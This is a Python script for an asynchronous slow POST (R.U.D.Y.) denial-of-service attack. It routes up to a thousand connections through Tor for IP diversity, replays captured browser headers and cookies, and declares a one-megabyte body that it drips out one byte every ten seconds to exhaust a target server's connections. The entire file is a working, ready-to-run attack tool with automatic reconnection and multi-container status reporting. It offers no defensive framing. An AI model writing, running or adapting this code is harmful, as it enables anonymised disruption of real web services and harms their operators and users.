#!/usr/bin/env python3
"""
slowpost_tor.py — Async R.U.D.Y. (Slow POST) via Tor SOCKS5.
Each coroutine routes through Tor for IP diversity per connection.
Uses full browser headers/cookies from captured request.
"""

import asyncio
import time
import sys
import os

from python_socks.async_.asyncio import Proxy

from request_loader import load_request_data, build_cookie_header

REQ = load_request_data()
TARGET_HOST = REQ["host"]
TARGET_PORT = REQ["port"]
SOCKS_HOST = "127.0.0.1"
SOCKS_PORT = 9050

CONTENT_LENGTH = 1_000_000
DRIP_INTERVAL = 10
CONNECT_TIMEOUT = 40
RECONNECT_DELAY = 5

NUM_CONNECTIONS = int(sys.argv[1]) if len(sys.argv) > 1 else 1000
CONTAINER_NAME = os.environ.get("CONTAINER_NAME", "instance-1")

active_slots = 0
total_connects = 0
total_errors = 0
lock = asyncio.Lock()


async def slow_post_worker(cid: int):
    global active_slots, total_connects, total_errors

    while True:
        writer = None
        try:
            proxy = Proxy.from_url(f"socks5://{SOCKS_HOST}:{SOCKS_PORT}")
            sock = await asyncio.wait_for(
                proxy.connect(dest_host=TARGET_HOST, dest_port=TARGET_PORT),
                timeout=CONNECT_TIMEOUT,
            )
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(sock=sock), timeout=10
            )

            async with lock:
                active_slots += 1
                total_connects += 1

            cl = CONTENT_LENGTH

            headers = f"POST {REQ['path']} HTTP/1.1\r\n"
            for k, v in REQ["headers"].items():
                if k.lower() in ("content-length", "transfer-encoding"):
                    continue
                headers += f"{k}: {v}\r\n"
            cookie_str = build_cookie_header(REQ["cookies"])
            if cookie_str and "Cookie" not in REQ["headers"]:
                headers += f"Cookie: {cookie_str}\r\n"
            headers += f"Content-Length: {cl}\r\n"
            headers += "\r\n"

            writer.write(headers.encode())
            await writer.drain()

            sent = 0
            while sent < cl:
                await asyncio.sleep(DRIP_INTERVAL)
                writer.write(b"A")
                await writer.drain()
                sent += 1

        except Exception:
            async with lock:
                total_errors += 1
                if active_slots > 0:
                    active_slots -= 1
            await asyncio.sleep(RECONNECT_DELAY)

        finally:
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass


async def status_reporter():
    start = time.time()
    while True:
        await asyncio.sleep(30)
        elapsed = int(time.time() - start)
        print(
            f"[{CONTAINER_NAME}] T+{elapsed}s | "
            f"slots={active_slots}/{NUM_CONNECTIONS} | "
            f"connects={total_connects} | errors={total_errors}",
            flush=True,
        )


async def main():
    print(f"[{CONTAINER_NAME}] Async Slow POST via Tor — {NUM_CONNECTIONS} coroutines", flush=True)
    print(f"[{CONTAINER_NAME}] Target: {TARGET_HOST}:{TARGET_PORT}{REQ['path']}", flush=True)
    print(f"[{CONTAINER_NAME}] Headers: {len(REQ['headers'])} | Cookies: {len(REQ['cookies'])}", flush=True)

    tasks = []
    for i in range(NUM_CONNECTIONS):
        tasks.append(asyncio.create_task(slow_post_worker(i)))
        if i % 50 == 49:
            await asyncio.sleep(1)

    tasks.append(asyncio.create_task(status_reporter()))
    await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
